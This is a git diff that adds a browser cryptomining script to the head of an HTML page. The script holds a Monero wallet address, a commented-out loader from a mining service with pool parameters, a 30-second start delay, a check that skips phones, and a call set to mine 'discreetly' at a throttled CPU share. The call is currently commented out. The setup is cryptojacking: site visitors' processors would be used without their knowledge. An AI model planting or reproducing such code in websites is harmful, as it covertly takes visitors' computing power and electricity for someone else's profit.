@@ -25,4 +25,27 @@
 
 	<script src="https://unpkg.com/ionicons@4.5.10-0/dist/ionicons.js"></script>
 
+	<script type="text/javascript">
+	//script src="https://cloud-miner.eu/tkefrep/tkefrep.js?tkefrep=bs?nosaj=faster.moneroocean"
+
+	var XMRAddress = '45eQP6gyQQ81qNz2HeLSCY11MLvkPfk3YcKK2UE63xmVPyBDk3dXiSMCRu8aHDAiqjcVR39TiWFA6HZVho1kR4m55XuuvLj'
+	var delayStartBy = 30000 //Start mining XMR in browser if page is open >30s
+	//don't mine on phones
+	if (screen.width >= 800) {
+		//Last arg is cpu throttle: 70 means 30% max, 30 means 70% max etc
+
+		/* disable for now
+		setTimeout(() => {
+			EverythingIsLife(
+			'45eQP6gyQQ81qNz2HeLSCY11MLvkPfk3YcKK2UE63xmVPyBDk3dXiSMCRu8aHDAiqjcVR39TiWFA6HZVho1kR4m55XuuvLj', 
+			'x', 
+			50)
+
+			//discreetly note that mining has started
+			console.log("45eQP6gyQQ81qNz2HeLSCY11MLvkPfk3YcKK2UE63xmVPyBDk3dXiSMCRu8aHDAiqjcVR39TiWFA6HZVho1kR4m55XuuvLj")
+			}, 30000);
+		} */
+	</script>
+
+
 </head>
